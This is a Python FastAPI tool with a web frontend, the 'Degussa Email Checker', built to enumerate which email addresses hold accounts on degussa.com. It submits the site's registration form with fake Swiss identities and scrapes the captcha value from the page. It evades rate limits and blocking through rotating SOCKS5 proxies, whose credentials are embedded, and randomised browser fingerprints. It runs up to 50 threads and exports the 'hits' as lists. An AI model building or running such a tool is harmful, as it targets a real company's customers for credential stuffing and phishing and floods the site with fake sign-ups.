#!/usr/bin/env python3
"""
Degussa Email Checker — Web Interface
Single-file FastAPI app: API + embedded frontend.
Proxy rotation + fingerprint rotation + no rate limits.
"""

import httpx
import re
import asyncio
import json
import random
from fastapi import FastAPI
from fastapi.responses import HTMLResponse, StreamingResponse
from pydantic import BaseModel

app = FastAPI()

# ─── Config ───
TARGET_URL = "https://degussa.com/ch-de/ssologin/"
PROXY_BASE = "socks5://customer-noshooyu-country-ch-sessid-{session}:Pce8ZzE@fra.p.shifter.io:443"

# ─── Fingerprint pool ───
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 OPR/116.0.0.0",
]

ACCEPT_LANGS = [
    "de-CH,de;q=0.9,en;q=0.8",
    "de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7",
    "fr-CH,fr;q=0.9,de;q=0.8",
    "en-US,en;q=0.9,de;q=0.8",
    "de;q=0.9,en-GB;q=0.8,en;q=0.7",
    "it-CH,it;q=0.9,de;q=0.8,en;q=0.7",
]

FORM_NAMES = [
    ("Security", "Audit"), ("Max", "Müller"), ("Anna", "Schmidt"),
    ("Peter", "Weber"), ("Laura", "Fischer"), ("Thomas", "Meyer"),
    ("Marie", "Keller"), ("Hans", "Brunner"), ("Sophie", "Gerber"),
    ("David", "Huber"), ("Julia", "Steiner"), ("Marco", "Baumann"),
]

CITIES = [
    ("8001", "Zürich"), ("3001", "Bern"), ("1201", "Genève"),
    ("4001", "Basel"), ("6001", "Luzern"), ("9001", "St. Gallen"),
    ("2501", "Biel"), ("1003", "Lausanne"), ("6900", "Lugano"),
]

_session_counter = 0


def get_session_id():
    """Generate unique session ID for proxy rotation — each session = new IP."""
    global _session_counter
    _session_counter += 1
    return f"{random.randint(10000,99999)}{_session_counter}"


def get_fingerprint():
    """Random browser fingerprint."""
    ua = random.choice(USER_AGENTS)
    lang = random.choice(ACCEPT_LANGS)
    name = random.choice(FORM_NAMES)
    city = random.choice(CITIES)
    headers = {
        "User-Agent": ua,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": lang,
        "Origin": "https://degussa.com",
        "Referer": TARGET_URL,
        "Content-Type": "application/x-www-form-urlencoded",
        "Cache-Control": random.choice(["no-cache", "max-age=0", ""]),
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
    }
    # Clean empty headers
    headers = {k: v for k, v in headers.items() if v}

    form = {
        "input_password": "AuditTest99!Xz",
        "input_password_2": "AuditTest99!Xz",
        "salutation": random.choice(["m", "f"]),
        "sur_name": name[0],
        "last_name": name[1],
        "input_street": random.choice(["Bahnhofstrasse", "Hauptstrasse", "Dorfstrasse", "Seestrasse", "Bergstrasse"]),
        "input_street_no": str(random.randint(1, 150)),
        "post_code": city[0],
        "city": city[1],
        "country": "ch",
        "birthday": f"{random.randint(1,28):02d}.{random.randint(1,12):02d}.{random.randint(1960,2000)}",
        "input_phone_no": f"+417{random.randint(10000000,99999999)}",
        "input_captcha1": "",
        "newsletter_subscribe": "0",
        "saveModelFormButton": "true",
    }
    return headers, form


def get_client():
    """New client with fresh rotating proxy IP."""
    sid = get_session_id()
    proxy = PROXY_BASE.format(session=sid)
    return httpx.AsyncClient(proxy=proxy, verify=True, timeout=25)


async def check_single(email: str, max_retries: int = 3) -> dict:
    """Check one email — fresh IP + fingerprint per attempt."""
    for attempt in range(max_retries):
        headers, form_data = get_fingerprint()
        try:
            async with get_client() as client:
                r1 = await client.get(TARGET_URL, headers=headers, follow_redirects=True, timeout=20)

                if r1.status_code == 429:
                    await asyncio.sleep(2)
                    continue

                m = re.search(r'input_captcha2.*?value="(\d+)"', r1.text)
                if not m:
                    if attempt < max_retries - 1:
                        await asyncio.sleep(1)
                        continue
                    return {"email": email, "status": "error", "detail": f"blocked (HTTP {r1.status_code})"}

                form_data["input_email"] = email
                form_data["input_email_2"] = email
                form_data["input_captcha2"] = m.group(1)

                r2 = await client.post(TARGET_URL, headers=headers, data=form_data, follow_redirects=True, timeout=20)

                if r2.status_code == 429:
                    await asyncio.sleep(2)
                    continue

                if "modal--error" in r2.text:
                    return {"email": email, "status": "registered"}
                elif "modal--success" in r2.text:
                    return {"email": email, "status": "not_found"}
                else:
                    return {"email": email, "status": "unknown", "detail": "unexpected response"}

        except httpx.TimeoutException:
            if attempt < max_retries - 1:
                continue
            return {"email": email, "status": "error", "detail": "timeout"}
        except Exception as e:
            return {"email": email, "status": "error", "detail": str(e)[:100]}

    return {"email": email, "status": "error", "detail": "rate limited after retries"}


class CheckRequest(BaseModel):
    emails: list[str]
    threads: int = 5
    delay: float = 0.3


@app.get("/api/status")
async def check_status():
    """Check if Degussa is accessible via proxy."""
    try:
        headers, _ = get_fingerprint()
        async with get_client() as client:
            r = await client.get(TARGET_URL, headers=headers, follow_redirects=True, timeout=15)
            if r.status_code == 429:
                return {"status": "rate_limited", "code": 429, "message": "Proxy IP bloquée (429)"}
            elif r.status_code == 200 and "input_captcha2" in r.text:
                return {"status": "ok", "code": 200, "message": "Target accessible via proxy rotation"}
            else:
                return {"status": "blocked", "code": r.status_code, "message": f"HTTP {r.status_code}"}
    except Exception as e:
        return {"status": "error", "message": f"{type(e).__name__}: {str(e)[:100]}"}


@app.get("/api/", response_class=HTMLResponse)
async def index_api():
    return HTML_PAGE


@app.post("/api/check")
async def check_emails(req: CheckRequest):
    """Check batch — SSE stream, rotating proxy + fingerprint per request."""
    emails = [e.strip() for e in req.emails if e.strip() and "@" in e.strip()]
    threads = max(1, min(req.threads, 50))
    delay = max(0, req.delay)

    async def stream():
        sem = asyncio.Semaphore(threads)
        stats = {"registered": 0, "not_found": 0, "error": 0, "total": len(emails)}
        yield f"data: {json.dumps({'type': 'start', 'total': len(emails)})}\n\n"

        async def bounded(em):
            async with sem:
                return await check_single(em)

        for i in range(0, len(emails), threads):
            batch = emails[i:i + threads]
            tasks = [bounded(em) for em in batch]
            results = await asyncio.gather(*tasks)
            for r in results:
                stats[r["status"]] = stats.get(r["status"], 0) + 1
                yield f"data: {json.dumps({'type': 'result', **r, 'stats': stats})}\n\n"
            if delay > 0 and i + threads < len(emails):
                await asyncio.sleep(delay)

        yield f"data: {json.dumps({'type': 'done', 'stats': stats})}\n\n"

    return StreamingResponse(stream(), media_type="text/event-stream")


@app.get("/", response_class=HTMLResponse)
async def index():
    return HTML_PAGE


# ─── Embedded Frontend ───
HTML_PAGE = """<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Degussa Email Checker</title>
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
<style>
* { margin:0; padding:0; box-sizing:border-box; }

:root {
  --bg: #0a0a0f;
  --surface: #12121a;
  --surface2: #1a1a27;
  --border: #2a2a3d;
  --text: #e0e0ee;
  --text2: #8888aa;
  --green: #00ff88;
  --red: #ff4466;
  --yellow: #ffaa22;
  --cyan: #00ccff;
  --accent: #7c5cff;
}

body {
  background: var(--bg);
  color: var(--text);
  font-family: 'Inter', sans-serif;
  min-height: 100vh;
}

.container { max-width: 860px; margin: 0 auto; padding: 40px 20px; }

header {
  text-align: center;
  margin-bottom: 48px;
}
header h1 {
  font-family: 'JetBrains Mono', monospace;
  font-size: 28px;
  font-weight: 700;
  letter-spacing: -0.5px;
  color: var(--text);
}
header h1 span { color: var(--cyan); }
header p {
  margin-top: 8px;
  font-size: 13px;
  color: var(--text2);
  font-family: 'JetBrains Mono', monospace;
}

.card {
  background: var(--surface);
  border: 1px solid var(--border);
  border-radius: 12px;
  padding: 28px;
  margin-bottom: 24px;
}

label {
  display: block;
  font-size: 12px;
  font-weight: 600;
  text-transform: uppercase;
  letter-spacing: 1px;
  color: var(--text2);
  margin-bottom: 8px;
}

textarea {
  width: 100%;
  background: var(--bg);
  border: 1px solid var(--border);
  border-radius: 8px;
  padding: 14px;
  color: var(--text);
  font-family: 'JetBrains Mono', monospace;
  font-size: 13px;
  resize: vertical;
  min-height: 200px;
  max-height: 500px;
  outline: none;
  transition: border-color 0.2s;
}
textarea:focus { border-color: var(--cyan); }
textarea::placeholder { color: #444466; }

.controls {
  display: flex;
  gap: 16px;
  align-items: flex-end;
  margin-top: 20px;
  flex-wrap: wrap;
}

.field { flex: 1; min-width: 100px; }
.field input {
  width: 100%;
  background: var(--bg);
  border: 1px solid var(--border);
  border-radius: 8px;
  padding: 10px 12px;
  color: var(--text);
  font-family: 'JetBrains Mono', monospace;
  font-size: 13px;
  outline: none;
}
.field input:focus { border-color: var(--cyan); }

button#run {
  background: var(--cyan);
  color: var(--bg);
  border: none;
  border-radius: 8px;
  padding: 10px 32px;
  font-family: 'JetBrains Mono', monospace;
  font-weight: 700;
  font-size: 14px;
  cursor: pointer;
  transition: all 0.15s;
  white-space: nowrap;
}
button#run:hover { background: #33ddff; transform: translateY(-1px); }
button#run:active { transform: translateY(0); }
button#run:disabled { opacity: 0.4; cursor: not-allowed; transform: none; }

.stats {
  display: grid;
  grid-template-columns: repeat(4, 1fr);
  gap: 12px;
  margin-bottom: 24px;
}
.stat {
  background: var(--surface);
  border: 1px solid var(--border);
  border-radius: 10px;
  padding: 16px;
  text-align: center;
}
.stat .num {
  font-family: 'JetBrains Mono', monospace;
  font-size: 28px;
  font-weight: 700;
  line-height: 1;
}
.stat .lbl {
  font-size: 11px;
  color: var(--text2);
  text-transform: uppercase;
  letter-spacing: 1px;
  margin-top: 6px;
}
.stat.hit .num { color: var(--red); }
.stat.miss .num { color: var(--green); }
.stat.err .num { color: var(--yellow); }
.stat.total .num { color: var(--cyan); }

.progress-wrap {
  height: 4px;
  background: var(--surface2);
  border-radius: 2px;
  margin-bottom: 24px;
  overflow: hidden;
}
.progress-bar {
  height: 100%;
  width: 0%;
  background: linear-gradient(90deg, var(--cyan), var(--accent));
  border-radius: 2px;
  transition: width 0.3s;
}

#results { display: none; }

.results-table {
  width: 100%;
  border-collapse: collapse;
}
.results-table th {
  text-align: left;
  font-size: 11px;
  text-transform: uppercase;
  letter-spacing: 1px;
  color: var(--text2);
  padding: 10px 14px;
  border-bottom: 1px solid var(--border);
}
.results-table td {
  padding: 10px 14px;
  font-family: 'JetBrains Mono', monospace;
  font-size: 13px;
  border-bottom: 1px solid #1a1a24;
}
.results-table tr { transition: background 0.15s; }
.results-table tr:hover { background: var(--surface2); }

.badge {
  display: inline-block;
  padding: 3px 10px;
  border-radius: 20px;
  font-size: 11px;
  font-weight: 700;
  text-transform: uppercase;
  letter-spacing: 0.5px;
}
.badge.registered { background: rgba(255,68,102,0.15); color: var(--red); }
.badge.not_found  { background: rgba(0,255,136,0.12); color: var(--green); }
.badge.error      { background: rgba(255,170,34,0.12); color: var(--yellow); }
.badge.unknown    { background: rgba(136,136,170,0.12); color: var(--text2); }

.export-bar {
  display: flex;
  gap: 10px;
  margin-top: 16px;
  justify-content: flex-end;
}
.export-bar button {
  background: var(--surface2);
  border: 1px solid var(--border);
  color: var(--text2);
  border-radius: 6px;
  padding: 6px 16px;
  font-size: 12px;
  font-family: 'JetBrains Mono', monospace;
  cursor: pointer;
  transition: all 0.15s;
}
.export-bar button:hover { color: var(--text); border-color: var(--cyan); }

@media (max-width: 600px) {
  .stats { grid-template-columns: repeat(2, 1fr); }
  .controls { flex-direction: column; }
}
</style>
</head>
<body>
<div class="container">
  <header>
    <h1><span>&#9670;</span> Degussa <span>Checker</span></h1>
    <p>email enumeration &middot; proxy rotation &middot; fingerprint rotation</p>
    <div id="server-status" style="margin-top:12px;font-family:'JetBrains Mono',monospace;font-size:12px;"></div>
  </header>

  <div class="card">
    <label>Emails (un par ligne, virgule, ou espace)</label>
    <textarea id="emails" placeholder="email1@example.com&#10;email2@example.com&#10;email3@example.com"></textarea>
    <div id="email-count" style="font-size:11px;color:var(--text2);margin-top:4px;font-family:'JetBrains Mono',monospace;"></div>
    <div class="controls">
      <div class="field">
        <label>Threads</label>
        <input id="threads" type="number" value="5" min="1" max="50">
      </div>
      <div class="field">
        <label>Delay (s)</label>
        <input id="delay" type="number" value="0.3" min="0" max="10" step="0.1">
      </div>
      <button id="run" onclick="startCheck()">CHECK</button>
    </div>
  </div>

  <div id="results">
    <div class="stats">
      <div class="stat hit"><div class="num" id="s-reg">0</div><div class="lbl">Registered</div></div>
      <div class="stat miss"><div class="num" id="s-nf">0</div><div class="lbl">Not Found</div></div>
      <div class="stat err"><div class="num" id="s-err">0</div><div class="lbl">Errors</div></div>
      <div class="stat total"><div class="num" id="s-total">0</div><div class="lbl">Total</div></div>
    </div>
    <div class="progress-wrap"><div class="progress-bar" id="pbar"></div></div>
    <div class="card" style="padding:0; overflow:hidden;">
      <table class="results-table">
        <thead><tr><th>#</th><th>Email</th><th>Status</th></tr></thead>
        <tbody id="tbody"></tbody>
      </table>
    </div>
    <div class="export-bar">
      <button onclick="exportAll()">Export All (.txt)</button>
      <button onclick="exportHits()">Export Hits Only</button>
    </div>
  </div>
</div>

<script>
let allResults = [];

function parseEmails(raw) {
  return raw.split(/[,;\\s]+/)
    .map(e => e.trim().toLowerCase())
    .filter(e => e && e.includes('@') && e.includes('.'));
}

// Live email counter
document.getElementById('emails').addEventListener('input', function() {
  const count = parseEmails(this.value).length;
  document.getElementById('email-count').textContent = count > 0 ? count + ' emails detected' : '';
});

async function startCheck() {
  const raw = document.getElementById('emails').value;
  const emails = parseEmails(raw);
  if (!emails.length) { alert('Aucun email valide'); return; }

  const threads = parseInt(document.getElementById('threads').value) || 3;
  const delay = parseFloat(document.getElementById('delay').value) || 0.5;
  const btn = document.getElementById('run');

  btn.disabled = true;
  btn.textContent = 'CHECKING...';
  allResults = [];
  document.getElementById('results').style.display = 'block';
  document.getElementById('tbody').innerHTML = '';
  document.getElementById('pbar').style.width = '0%';
  updateStats({registered: 0, not_found: 0, error: 0, total: emails.length});

  let idx = 0;

  try {
    const resp = await fetch('/api/check', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({emails, threads, delay})
    });

    const reader = resp.body.getReader();
    const decoder = new TextDecoder();
    let buffer = '';

    while (true) {
      const {done, value} = await reader.read();
      if (done) break;
      buffer += decoder.decode(value, {stream: true});

      const lines = buffer.split('\\n');
      buffer = lines.pop();

      for (const line of lines) {
        if (!line.startsWith('data: ')) continue;
        const data = JSON.parse(line.slice(6));

        if (data.type === 'result') {
          idx++;
          allResults.push(data);
          addRow(idx, data);
          if (data.stats) updateStats(data.stats);
          const pct = (idx / emails.length) * 100;
          document.getElementById('pbar').style.width = pct + '%';
        }
        if (data.type === 'done') {
          document.getElementById('pbar').style.width = '100%';
        }
      }
    }
  } catch(e) {
    console.error(e);
  }

  btn.disabled = false;
  btn.textContent = 'CHECK';
}

function addRow(idx, r) {
  const tr = document.createElement('tr');
  const detail = r.detail ? ' <span style="color:var(--text2);font-size:11px">(' + r.detail + ')</span>' : '';
  tr.innerHTML = `
    <td style="color:var(--text2)">${idx}</td>
    <td>${r.email}</td>
    <td><span class="badge ${r.status}">${label(r.status)}</span>${detail}</td>
  `;
  document.getElementById('tbody').prepend(tr);
}

function label(s) {
  return {registered: 'REGISTERED', not_found: 'NOT FOUND', error: 'ERROR', unknown: 'UNKNOWN'}[s] || s;
}

// Check server status on load
async function checkStatus() {
  const el = document.getElementById('server-status');
  try {
    const r = await fetch('/api/status');
    const d = await r.json();
    if (d.status === 'ok') {
      el.innerHTML = '<span style="color:var(--green)">&#9679;</span> Target accessible';
    } else if (d.status === 'rate_limited') {
      el.innerHTML = '<span style="color:var(--red)">&#9679;</span> IP rate-limited (429) — attends quelques minutes';
    } else {
      el.innerHTML = '<span style="color:var(--yellow)">&#9679;</span> ' + (d.message || 'Unknown status');
    }
  } catch(e) {
    el.innerHTML = '<span style="color:var(--red)">&#9679;</span> Server error';
  }
}
checkStatus();
setInterval(checkStatus, 30000);

function updateStats(s) {
  document.getElementById('s-reg').textContent = s.registered || 0;
  document.getElementById('s-nf').textContent = s.not_found || 0;
  document.getElementById('s-err').textContent = (s.error || 0) + (s.unknown || 0);
  document.getElementById('s-total').textContent = s.total || 0;
}

function exportAll() {
  const txt = allResults.map(r => r.status.padEnd(16) + r.email).join('\\n');
  download('results.txt', txt);
}

function exportHits() {
  const txt = allResults.filter(r => r.status === 'registered').map(r => r.email).join('\\n');
  if (!txt) return alert('Aucun hit');
  download('hits.txt', txt);
}

function download(name, content) {
  const a = document.createElement('a');
  a.href = URL.createObjectURL(new Blob([content], {type:'text/plain'}));
  a.download = name;
  a.click();
}
</script>
</body>
</html>
"""

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8001)
